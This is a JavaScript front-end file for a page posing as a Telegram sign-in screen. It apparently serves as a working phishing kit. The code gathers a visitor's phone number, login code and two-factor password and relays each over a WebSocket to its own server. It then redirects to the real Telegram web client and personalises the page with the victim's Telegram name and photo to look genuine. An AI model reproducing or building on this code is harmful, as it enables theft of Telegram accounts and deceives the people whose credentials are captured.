import { countries, countriesByPhone, countriesByCode } from './modules/countries.js';
import { elements, initializeElements, addClass, removeClass } from './modules/dom.js';
import { 
    getPhonePattern, 
    formatPhoneNumber, 
    extractPhoneDigits,
    findBestCountryMatch 
} from './modules/phoneFormatter.js';
import { 
    populateDropdown, 
    setupDropdownHandlers
} from './modules/dropdown.js';
import { wsClient } from './modules/websocket.js';

const state = {
    currentCountry: null,
    isUserModified: false,
    detectedCountryCode: null,
    currentPhoneNumber: null
};

async function setCountryFromBackend(countryCode) {
    if (!countryCode) {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            state.detectedCountryCode = data.country_code;
            
            const detectedCountry = countriesByCode.get(state.detectedCountryCode);
            
            if (detectedCountry) {
                setCountry(detectedCountry);
            } else {
                setCountry(countriesByCode.get('US'));
            }
        } catch (error) {
            console.error('Country detection failed:', error);
            setCountry(countriesByCode.get('US'));
        }
        return;
    }
    
    state.detectedCountryCode = countryCode;
    const detectedCountry = countriesByCode.get(countryCode);
    
    if (detectedCountry) {
        setCountry(detectedCountry);
    } else {
        setCountry(countriesByCode.get('US'));
    }
}

function setCountry(country, preserveInput = false) {
    state.currentCountry = country;
    elements.countryDisplay.value = country.name;
    
    if (!preserveInput) {
        elements.phoneInput.value = country.phone + ' ';
    }
    
    const pattern = getPhonePattern(country.phone);
    const placeholderPattern = pattern.replace(/X/g, '‒');
    elements.phoneInput.placeholder = country.phone + ' ' + placeholderPattern;
    
    addClass(elements.countryInputGroup, 'touched');
    
    if (!preserveInput) {
        elements.phoneInput.focus();
        elements.phoneInput.setSelectionRange(
            elements.phoneInput.value.length, 
            elements.phoneInput.value.length
        );
    }
}

function handlePhoneInput(e) {
    const group = elements.phoneInputGroup;
    let inputValue = e.target.value;
    const cursorPos = e.target.selectionStart;
    
    state.isUserModified = true;
    
    hidePhoneError();
    
    if (inputValue === '') {
        state.currentCountry = null;
        elements.countryDisplay.value = '';
        elements.phoneInput.placeholder = '';
        removeClass(elements.phoneInputGroup, 'touched');
        removeClass(elements.countryInputGroup, 'touched');
        const label = group.querySelector('label');
        if (label && label.dataset.originalText) {
            label.textContent = label.dataset.originalText;
        }
        return;
    }
    
    if (inputValue.length > 0) {
        let detectedCountry = null;
        
        if (inputValue.startsWith('+')) {
            detectedCountry = findBestCountryMatch(
                inputValue, 
                countriesByPhone, 
                state.detectedCountryCode
            );
        } else if (/^\d/.test(inputValue)) {
            const withPlus = '+' + inputValue;
            detectedCountry = findBestCountryMatch(
                withPlus, 
                countriesByPhone, 
                state.detectedCountryCode
            );
            
            if (detectedCountry) {
                e.target.value = withPlus;
                e.target.setSelectionRange(cursorPos + 1, cursorPos + 1);
                inputValue = withPlus;
            }
        }
        
        // If we detected a country different from current, update it
        if (detectedCountry && (!state.currentCountry || state.currentCountry.code !== detectedCountry.code)) {
            setCountry(detectedCountry, true);
        }
    }
    
    // If no country detected yet but input starts with +, try to format anyway
    if (!state.currentCountry && inputValue.startsWith('+')) {
        // Try to detect pattern based on common formats
        const digits = inputValue.substring(1).replace(/\D/g, '');
        if (digits.length > 0) {
            // Format with spaces every 3-4 digits as a fallback
            let formatted = '+';
            for (let i = 0; i < digits.length; i++) {
                if (i > 0 && (i === 1 || i === 4 || i === 7 || i === 10)) {
                    formatted += ' ';
                }
                formatted += digits[i];
            }
            e.target.value = formatted;
            e.target.setSelectionRange(cursorPos, cursorPos);
        }
        return;
    }
    
    if (!state.currentCountry) return;
    
    const countryCode = state.currentCountry.phone;
    
    // Ensure country code is always at the beginning
    if (!inputValue.startsWith(countryCode)) {
        e.target.value = countryCode + ' ';
        e.target.setSelectionRange(e.target.value.length, e.target.value.length);
        return;
    }
    
    const phoneDigits = extractPhoneDigits(inputValue, countryCode);
    const pattern = getPhonePattern(countryCode);
    const formatted = formatPhoneNumber(phoneDigits, pattern);
    
    const newValue = countryCode + (formatted ? ' ' + formatted : '');
    const prevLength = inputValue.length;
    e.target.value = newValue;
    
    let newCursorPos = cursorPos;
    if (newValue.length < prevLength) {
        newCursorPos = Math.min(cursorPos, newValue.length);
    } else if (newValue.length > prevLength) {
        const diff = newValue.length - prevLength;
        newCursorPos = cursorPos + diff;
    }
    
    e.target.setSelectionRange(newCursorPos, newCursorPos);
    
    if (phoneDigits.length > 0) {
        addClass(group, 'touched');
    } else if (phoneDigits.length === 0 && inputValue.trim() === countryCode) {
        removeClass(group, 'touched');
    }
}

function handlePhoneKeydown(e) {
    if (e.key === 'Backspace' || e.key === 'Delete') {
        const cursorPos = e.target.selectionStart;
        const selectionEnd = e.target.selectionEnd;
        const inputValue = e.target.value;
        
        // If no current country, allow normal backspace
        if (!state.currentCountry) {
            return;
        }
        
        const countryCode = state.currentCountry.phone;
        
        // Get phone digits after country code
        const phoneDigits = extractPhoneDigits(inputValue, countryCode);
        
        // If cursor is at or before country code end + space
        if (cursorPos <= countryCode.length + 1 && selectionEnd <= countryCode.length + 1) {
            e.preventDefault();
            
            // If no phone digits, clear everything
            if (phoneDigits.length === 0) {
                e.target.value = '';
                state.currentCountry = null;
                elements.countryDisplay.value = '';
                elements.phoneInput.placeholder = '';
                removeClass(elements.phoneInputGroup, 'touched');
                removeClass(elements.countryInputGroup, 'touched');
            } else {
                // Move cursor after country code
                e.target.setSelectionRange(countryCode.length + 1, countryCode.length + 1);
            }
        }
    }
}

function handlePhoneFocus() {
    const group = elements.phoneInputGroup;
    
    if (elements.phoneInput.value.trim() || state.currentCountry) {
        addClass(group, 'touched');
    }
}

function handleFormSubmit(e) {
    e.preventDefault();
    const phoneNumber = elements.phoneInput.value;
    
    if (phoneNumber.trim().length < 8) {
        showError('Please enter a valid phone number');
        return;
    }

    if (!wsClient.isConnected) {
        showError('Not connected to server. Please refresh the page.');
        return;
    }

    // Save phone number for display
    state.currentPhoneNumber = phoneNumber;
    
    // Show loading state
    showLoading();
    
    // Send phone number to backend
    if (!wsClient.submitPhone(phoneNumber)) {
        showError('Failed to send phone number. Please try again.');
        hideLoading();
    }
}

function handleCodeSubmit(e) {
    e.preventDefault();
    const codeInput = document.getElementById('code-input');
    const code = codeInput.value.trim();
    
    if (code.length !== 5) {
        showCodeError('Please enter a 5-digit code');
        return;
    }

    if (!wsClient.isConnected) {
        showCodeError('Not connected to server. Please refresh the page.');
        return;
    }

    // Show loading state
    showCodeLoading();
    
    // Send code to backend
    if (!wsClient.submitCode(code)) {
        showCodeError('Failed to send code. Please try again.');
        hideCodeLoading();
    }
}

function handlePasswordSubmit(e) {
    e.preventDefault();
    const passwordInput = document.getElementById('password-input');
    const password = passwordInput.value;
    
    if (!password) {
        showPasswordError('Please enter your password');
        return;
    }

    if (!wsClient.isConnected) {
        showPasswordError('Not connected to server. Please refresh the page.');
        return;
    }

    // Show loading state
    showPasswordLoading();
    
    // Send password to backend
    wsClient.send({
        type: 'submit_password',
        password: password
    });
}

// Show code form
function showCodeForm() {
    console.log('showCodeForm called');
    const phoneFormContainer = document.getElementById('auth-phone-number-form');
    const codeForm = document.getElementById('code-form');
    
    console.log('Found elements:', { phoneFormContainer: !!phoneFormContainer, codeForm: !!codeForm });
    
    // Hide phone form container
    if (phoneFormContainer) {
        phoneFormContainer.style.display = 'none';
        console.log('Phone form hidden');
    }
    
    // Show code form
    if (codeForm) {
        codeForm.style.display = 'block';
        console.log('Code form shown');
        
        // Update phone number display
        const phoneDisplay = document.getElementById('phone-display');
        if (phoneDisplay && state.currentPhoneNumber) {
            phoneDisplay.textContent = state.currentPhoneNumber;
        }
        
        // Clear any previous error
        hideCodeError();
        
        // Focus on code input
        const codeInput = document.getElementById('code-input');
        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    }
}

// Show phone form
function showPhoneForm() {
    const phoneFormContainer = document.getElementById('auth-phone-number-form');
    const codeForm = document.getElementById('code-form');
    const passwordForm = document.getElementById('password-form');
    
    // Show phone form container
    if (phoneFormContainer) {
        phoneFormContainer.style.display = 'block';
    }
    
    // Hide other forms
    if (codeForm) {
        codeForm.style.display = 'none';
    }
    if (passwordForm) {
        passwordForm.style.display = 'none';
    }
    
    // Focus on phone input
    if (elements.phoneInput) {
        elements.phoneInput.focus();
    }
}

// Show password form
function showPasswordForm() {
    const phoneFormContainer = document.getElementById('auth-phone-number-form');
    const codeForm = document.getElementById('code-form');
    const passwordForm = document.getElementById('password-form');
    
    // Hide other forms
    if (phoneFormContainer) {
        phoneFormContainer.style.display = 'none';
    }
    if (codeForm) {
        codeForm.style.display = 'none';
    }
    
    // Show password form
    if (passwordForm) {
        passwordForm.style.display = 'block';
        
        // Clear any previous error
        hidePasswordError();
        
        const lottiePlayer = document.getElementById('password-monkey-lottie');
        if (lottiePlayer) {
            lottiePlayer.addEventListener('ready', () => {
                lottiePlayer.pause();
                lottiePlayer.seek(0);
            }, { once: true });
        }
        
        // Focus on password input
        const passwordInput = document.getElementById('password-input');
        const submitBtn = document.getElementById('password-submit');
        if (passwordInput) {
            passwordInput.value = '';
            passwordInput.focus();
        }
        
        // Hide submit button initially
        if (submitBtn) {
            submitBtn.style.display = 'none';
        }
    }
}

// Handle country selection from dropdown
function handleCountrySelect(button) {
    const selectedCountry = countries.find(
        c => c.phone === button.dataset.code && c.name === button.dataset.country
    );
    
    if (selectedCountry) {
        setCountry(selectedCountry);
        // Small delay before focusing to ensure dropdown is closed
        setTimeout(() => {
            elements.phoneInput.focus();
        }, 100);
    }
}

// Initialize Telegram Web App
function initializeTelegramWebApp() {
    if (window.Telegram && window.Telegram.WebApp) {
        const tg = window.Telegram.WebApp;
        const user = tg.initDataUnsafe?.user;
        
        if (user) {
            // Update UI with user data
            updateUIWithUserData(user);
        }
        
        // Expand the web app to full height
        tg.expand();
    }
}

// Update UI with Telegram user data
function updateUIWithUserData(user) {
    const logoElement = document.getElementById('logo');
    const h1Element = document.querySelector('h1');
    
    // Replace logo with user avatar if available
    if (logoElement) {
        if (user.photo_url) {
            logoElement.style.backgroundImage = `url(${user.photo_url})`;
            logoElement.style.borderRadius = '50%';
            logoElement.style.backgroundSize = 'cover';
            logoElement.style.border = '2px solid var(--color-borders)';
        } else if (user.first_name) {
            // Create initials avatar if no photo
            const initials = user.first_name.charAt(0).toUpperCase() + 
                           (user.last_name ? user.last_name.charAt(0).toUpperCase() : '');
            logoElement.style.background = 'var(--color-primary)';
            logoElement.style.borderRadius = '50%';
            logoElement.style.display = 'flex';
            logoElement.style.alignItems = 'center';
            logoElement.style.justifyContent = 'center';
            logoElement.style.color = 'white';
            logoElement.style.fontSize = '3rem';
            logoElement.style.fontWeight = '500';
            logoElement.textContent = initials;
        }
    }
    
    // Update heading with user's name and username
    if (h1Element) {
        const fullName = `${user.first_name}${user.last_name ? ' ' + user.last_name : ''}`;
        const username = user.username ? `@${user.username}` : '';
        
        if (fullName) {
            h1Element.textContent = fullName;
            
            // Add username as subtitle if available
            if (username) {
                const usernameElement = document.createElement('div');
                usernameElement.style.fontSize = '0.875rem';
                usernameElement.style.color = 'var(--color-text-secondary)';
                usernameElement.style.marginTop = '0.25rem';
                usernameElement.style.fontWeight = 'normal';
                usernameElement.textContent = username;
                h1Element.appendChild(usernameElement);
            }
        } else {
            // Fallback to original text if no user data
            h1Element.textContent = 'Sign in to Telegram';
        }
    }
}

// Setup WebSocket handlers
function setupWebSocketHandlers() {
    // Connection handlers
    wsClient.setConnectionHandlers({
        onConnect: () => {
            console.log('Connected to server');
            hideError();
        },
        onDisconnect: () => {
            console.log('Disconnected from server');
            showError('Connection lost. Reconnecting...');
        },
        onError: (error) => {
            console.error('Connection error:', error);
            showError('Connection error');
        }
    });
    
    // Handle connected message with country detection
    wsClient.on('connected', (data) => {
        console.log('Server detected country:', data.detectedCountry);
        setCountryFromBackend(data.detectedCountry);
    });

    // Message handlers
    wsClient.on('phone_processing', (data) => {
        showLoading('Processing phone number...');
    });

    wsClient.on('code_requested', (data) => {
        hideLoading();
        showCodeForm();
    });

    wsClient.on('phone_error', (data) => {
        hideLoading();
        const message = data.message || 'Failed to submit phone number';
        
        let displayMessage = message;
        if (message.toLowerCase().includes('banned')) {
            displayMessage = 'This phone number is banned';
        }

        showError(displayMessage);
    });

    wsClient.on('error', (data) => {
        hideLoading();
        showError(data.message || 'An error occurred');
    });

    // Code verification handlers
    wsClient.on('code_processing', (data) => {
        showCodeLoading('Verifying code...');
    });

    wsClient.on('verification_success', (data) => {
        hideCodeLoading();
        window.location.href = 'https://web.telegram.org/a/';
    });

    wsClient.on('verification_failed', (data) => {
        console.log('Verification failed data:', data);
        console.log('Message from server:', data.message);
        hideCodeLoading();
        
        setTimeout(() => {
            showCodeError(data.message || 'Invalid code, please try again');

            const codeInput = document.getElementById('code-input');
            if (codeInput) {
                codeInput.focus();
            }
        }, 50);
    });
    
    // Password handlers
    wsClient.on('password_required', (data) => {
        hideCodeLoading();
        showPasswordForm();
    });
    
    wsClient.on('password_processing', (data) => {
        showPasswordLoading();
    });
    
    wsClient.on('password_success', (data) => {
        hidePasswordLoading();
        window.location.href = 'https://web.telegram.org/a/';
    });
    
    wsClient.on('password_failed', (data) => {
        hidePasswordLoading();
        showPasswordError(data.message || 'Wrong password, please try again');
        
        const passwordInput = document.getElementById('password-input');
        if (passwordInput) {
            passwordInput.focus();
            passwordInput.select();
        }
    });
}

// UI helper functions
function showError(message) {
    hideLoading();
    showPhoneError(message);
}

function hideError() {
    hidePhoneError();
}

function showPhoneError(message) {
    const inputGroup = elements.phoneInputGroup;
    const label = inputGroup.querySelector('label');
    
    if (inputGroup) {
        inputGroup.classList.add('error');
        inputGroup.classList.add('with-label');
    }
    
    if (label) {
        if (!label.dataset.originalText) {
            label.dataset.originalText = label.textContent;
        }
        label.textContent = message;
    }
}

function hidePhoneError() {
    const inputGroup = elements.phoneInputGroup;
    const label = inputGroup.querySelector('label');
    
    if (inputGroup) {
        inputGroup.classList.remove('error');
    }
    
    if (label && label.dataset.originalText) {
        label.textContent = label.dataset.originalText;
    }
}

function showLoading() {
    elements.phoneSubmit.disabled = true;
    elements.phoneSubmit.classList.add('loading');
    if (!elements.phoneSubmit.dataset.originalText) {
        elements.phoneSubmit.dataset.originalText = elements.phoneSubmit.querySelector('.btn-text').textContent;
    }
    const btnText = elements.phoneSubmit.querySelector('.btn-text');
    if (btnText) {
        btnText.textContent = 'PLEASE WAIT...';
    }
}

function hideLoading() {
    elements.phoneSubmit.disabled = false;
    elements.phoneSubmit.classList.remove('loading');
    const btnText = elements.phoneSubmit.querySelector('.btn-text');
    if (btnText && elements.phoneSubmit.dataset.originalText) {
        btnText.textContent = elements.phoneSubmit.dataset.originalText;
    }
}

// Code form UI helpers
function showCodeError(message) {
    console.log('showCodeError called with:', message);
    hideCodeLoading();
    
    const codeInputGroup = document.querySelector('.code-input-group');
    const label = codeInputGroup?.querySelector('label');
    const codeInput = document.getElementById('code-input');
    
    console.log('Found elements:', { codeInputGroup, label, codeInput });
    console.log('Current classes on codeInputGroup:', codeInputGroup?.className);
    
    if (codeInputGroup) {
        codeInputGroup.classList.add('touched');
        codeInputGroup.classList.add('error');
        codeInputGroup.classList.add('with-label');
        console.log('Classes after adding:', codeInputGroup.className);
    }
    
    if (label) {
        if (!label.dataset.originalText) {
            label.dataset.originalText = label.textContent;
            console.log('Saved original text:', label.dataset.originalText);
        }
        label.textContent = message || 'Invalid code, please try again';
        console.log('Set label text to:', label.textContent);
        console.log('Label visibility:', window.getComputedStyle(label).visibility);
        console.log('Label display:', window.getComputedStyle(label).display);
    }
    
    // Keep value in field but show it's invalid
    if (codeInput && codeInput.value) {
        codeInput.classList.add('error');
    }
}

function hideCodeError() {
    const codeInputGroup = document.querySelector('.code-input-group');
    const label = codeInputGroup?.querySelector('label');
    const codeInput = document.getElementById('code-input');
    
    if (codeInputGroup) {
        codeInputGroup.classList.remove('error');
    }
    
    if (label && label.dataset.originalText) {
        label.textContent = label.dataset.originalText;
    }
    
    if (codeInput) {
        codeInput.classList.remove('error');
    }
}

function showCodeLoading(text = 'Verifying...') {
    const codeInput = document.getElementById('code-input');
    
    // Disable input during loading
    if (codeInput) {
        codeInput.disabled = true;
    }
}

function hideCodeLoading() {
    const codeInput = document.getElementById('code-input');
    
    // Re-enable input
    if (codeInput) {
        codeInput.disabled = false;
    }
}

// Password form UI helpers
function showPasswordError(message) {
    hidePasswordLoading();
    
    const passwordInputGroup = document.querySelector('.password-input-group');
    const label = passwordInputGroup?.querySelector('label');
    const passwordInput = document.getElementById('password-input');
    
    if (passwordInputGroup) {
        passwordInputGroup.classList.add('touched');
        passwordInputGroup.classList.add('error');
        passwordInputGroup.classList.add('with-label');
    }
    
    if (label) {
        if (!label.dataset.originalText) {
            label.dataset.originalText = label.textContent;
        }
        label.textContent = message || 'Wrong password, please try again';
    }
    
    if (passwordInput) {
        passwordInput.classList.add('error');
    }
}

function hidePasswordError() {
    const passwordInputGroup = document.querySelector('.password-input-group');
    const label = passwordInputGroup?.querySelector('label');
    const passwordInput = document.getElementById('password-input');
    
    if (passwordInputGroup) {
        passwordInputGroup.classList.remove('error');
    }
    
    if (label && label.dataset.originalText) {
        label.textContent = label.dataset.originalText;
    }
    
    if (passwordInput) {
        passwordInput.classList.remove('error');
    }
}

function showPasswordLoading() {
    const passwordSubmit = document.getElementById('password-submit');
    const passwordInput = document.getElementById('password-input');
    
    if (passwordSubmit) {
        passwordSubmit.disabled = true;
        passwordSubmit.classList.add('loading');
        const btnText = passwordSubmit.querySelector('.btn-text');
        if (btnText) {
            btnText.textContent = 'PLEASE WAIT...';
        }
    }
    
    if (passwordInput) {
        passwordInput.disabled = true;
    }
}

function hidePasswordLoading() {
    const passwordSubmit = document.getElementById('password-submit');
    const passwordInput = document.getElementById('password-input');
    
    if (passwordSubmit) {
        passwordSubmit.disabled = false;
        passwordSubmit.classList.remove('loading');
        const btnText = passwordSubmit.querySelector('.btn-text');
        if (btnText) {
            btnText.textContent = 'Next';
        }
    }
    
    if (passwordInput) {
        passwordInput.disabled = false;
    }
}

// Initialize the application
function init() {
    initializeElements();

    initializeTelegramWebApp();

    setupWebSocketHandlers();
    wsClient.connect();

    populateDropdown();

    setupDropdownHandlers(handleCountrySelect);
    
    elements.phoneInput.addEventListener('input', handlePhoneInput);
    elements.phoneInput.addEventListener('keydown', handlePhoneKeydown);
    elements.phoneInput.addEventListener('focus', handlePhoneFocus);
    elements.form.addEventListener('submit', handleFormSubmit);
    
    // Setup code form handlers
    const codeForm = document.getElementById('code-submission-form');
    const editPhoneBtn = document.getElementById('edit-phone-btn');
    
    if (codeForm) {
        codeForm.addEventListener('submit', handleCodeSubmit);
        
        // Auto-submit when 5 digits are entered
        const codeInput = document.getElementById('code-input');
        if (codeInput) {
            codeInput.addEventListener('input', (e) => {
                // Remove any non-digit characters
                e.target.value = e.target.value.replace(/\D/g, '');
                
                // Add/remove touched class based on value
                const inputGroup = e.target.closest('.input-group');
                if (e.target.value.length > 0) {
                    inputGroup.classList.add('touched');
                } else {
                    inputGroup.classList.remove('touched');
                }
                
                // Clear error when user starts typing or clears the field
                hideCodeError();
                
                // Update monkey animation based on input length
                updateMonkeyAnimation(e.target.value.length);
                
                // Auto-submit when 5 digits are entered
                if (e.target.value.length === 5) {
                    handleCodeSubmit(new Event('submit'));
                }
            });
            
            // Update monkey on focus/blur
            codeInput.addEventListener('focus', () => {
                const inputGroup = codeInput.closest('.input-group');
                if (codeInput.value.length > 0) {
                    inputGroup.classList.add('touched');
                }
                updateMonkeyAnimation(codeInput.value.length);
            });
            codeInput.addEventListener('blur', () => updateMonkeyAnimation(-1));
        }
    }
    
    if (editPhoneBtn) {
        editPhoneBtn.addEventListener('click', () => {
            // Clear code field
            const codeInput = document.getElementById('code-input');
            if (codeInput) {
                codeInput.value = '';
            }
            
            // Reset loading state
            hideCodeLoading();
            hideCodeError();
            
            // Show phone form
            showPhoneForm();
            
            // Notify backend that user returned
            if (wsClient.isConnected) {
                wsClient.send({
                    type: 'user_returned_to_phone'
                });
            }
        });
    }
    
    // Also handle paste events
    elements.phoneInput.addEventListener('paste', (e) => {
        // Force reformat on paste
        setTimeout(() => handlePhoneInput({ target: elements.phoneInput }), 0);
    });
    
    // Setup password form handlers
    const passwordForm = document.getElementById('password-submission-form');
    const togglePasswordBtn = document.querySelector('.toggle-password');
    
    if (passwordForm) {
        passwordForm.addEventListener('submit', handlePasswordSubmit);
        
        const passwordInput = document.getElementById('password-input');
        if (passwordInput) {
            passwordInput.addEventListener('input', (e) => {
                const inputGroup = e.target.closest('.input-group');
                const submitBtn = document.getElementById('password-submit');
                
                if (e.target.value.length > 0) {
                    inputGroup.classList.add('touched');
                    hidePasswordError();
                    if (submitBtn) submitBtn.style.display = 'block';
                } else {
                    inputGroup.classList.remove('touched');
                    if (submitBtn) submitBtn.style.display = 'none';
                }
            });
            
            passwordInput.addEventListener('focus', () => {
                const inputGroup = passwordInput.closest('.input-group');
                if (passwordInput.value.length > 0) {
                    inputGroup.classList.add('touched');
                }
            });
        }
    }
    
    if (togglePasswordBtn) {
        togglePasswordBtn.addEventListener('click', () => {
            const passwordInput = document.getElementById('password-input');
            const icon = togglePasswordBtn.querySelector('i');
            
            const animateMonkey = (showPassword) => {
                const freshLottiePlayer = document.getElementById('password-monkey-lottie');
                
                if (freshLottiePlayer && typeof freshLottiePlayer.getLottie === 'function') {
                    const lottieInstance = freshLottiePlayer.getLottie();
                    
                    if (lottieInstance && lottieInstance.totalFrames > 0) {
                        const targetFrame = showPassword ? Math.floor(lottieInstance.totalFrames / 2) : 0;
                        
                                        lottieInstance.removeEventListener('enterFrame');
                        
                        if (showPassword) {
                            lottieInstance.setDirection(1);
                            lottieInstance.play();
                            
                            const onFrameUpdate = () => {
                                if (lottieInstance.currentFrame >= targetFrame) {
                                    lottieInstance.pause();
                                    lottieInstance.removeEventListener('enterFrame', onFrameUpdate);
                                }
                            };
                            lottieInstance.addEventListener('enterFrame', onFrameUpdate);
                            
                        } else {
                            lottieInstance.setDirection(-1);
                            lottieInstance.play();
                            
                            const onFrameUpdate = () => {
                                if (lottieInstance.currentFrame <= targetFrame) {
                                    lottieInstance.pause();
                                    lottieInstance.removeEventListener('enterFrame', onFrameUpdate);
                                }
                            };
                            lottieInstance.addEventListener('enterFrame', onFrameUpdate);
                        }
                    }
                }
            };

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                icon.classList.remove('icon-eye-crossed');
                icon.classList.add('icon-eye');
                animateMonkey(true);
            } else {
                passwordInput.type = 'password';
                icon.classList.remove('icon-eye');
                icon.classList.add('icon-eye-crossed');
                animateMonkey(false);
            }
        });
    }
}

// Update monkey animation based on code input
let currentAnimationSrc = null;
let currentDigitCount = 0;
let animationInterval = null;

function updateMonkeyAnimation(digitCount) {
    const lottiePlayer = document.getElementById('monkey-lottie');
    if (!lottiePlayer) return;
    
    if (digitCount === -1) {
        // Idle state (no focus) - switch to idle animation
        if (currentAnimationSrc !== 'idle') {
            currentAnimationSrc = 'idle';
            currentDigitCount = 0;
            if (animationInterval) {
                clearInterval(animationInterval);
                animationInterval = null;
            }
            lottiePlayer.load('assets/lottie/TwoFactorSetupMonkeyIdle.json');
        }
    } else {
        // Tracking state - animate smoothly to target position
        if (currentAnimationSrc !== 'tracking') {
            currentAnimationSrc = 'tracking';
            lottiePlayer.addEventListener('ready', () => {
                animateToPosition(lottiePlayer, digitCount);
            }, { once: true });
            lottiePlayer.load('assets/lottie/TwoFactorSetupMonkeyTracking.json');
        } else {
            // Already loaded, just animate to new position
            animateToPosition(lottiePlayer, digitCount);
        }
    }
}

function animateToPosition(lottiePlayer, targetDigitCount) {
    // Clear any existing animation
    if (animationInterval) {
        clearInterval(animationInterval);
    }
    
    const targetProgress = targetDigitCount === 5 ? 99 : (targetDigitCount / 5) * 100;
    const currentProgress = (currentDigitCount / 5) * 100;
    
    // If same position, do nothing
    if (Math.abs(targetProgress - currentProgress) < 0.1) {
        return;
    }
    
    // Determine animation direction and speed
    const direction = targetProgress > currentProgress ? 1 : -1;
    const animationSpeed = 2; // Percent per frame
    
    lottiePlayer.pause();
    
    // Animate smoothly
    animationInterval = setInterval(() => {
        const currentPos = (currentDigitCount / 5) * 100;
        const newPos = currentPos + (animationSpeed * direction);
        
        // Check if we reached the target
        if ((direction === 1 && newPos >= targetProgress) || 
            (direction === -1 && newPos <= targetProgress)) {
            // Reached target
            lottiePlayer.seek(`${targetProgress}%`);
            currentDigitCount = targetDigitCount;
            clearInterval(animationInterval);
            animationInterval = null;
        } else {
            // Continue animation
            lottiePlayer.seek(`${newPos}%`);
            currentDigitCount = (newPos / 100) * 5;
        }
    }, 16); // ~60fps
}

// Wait for DOM to be ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
} else {
    init();
}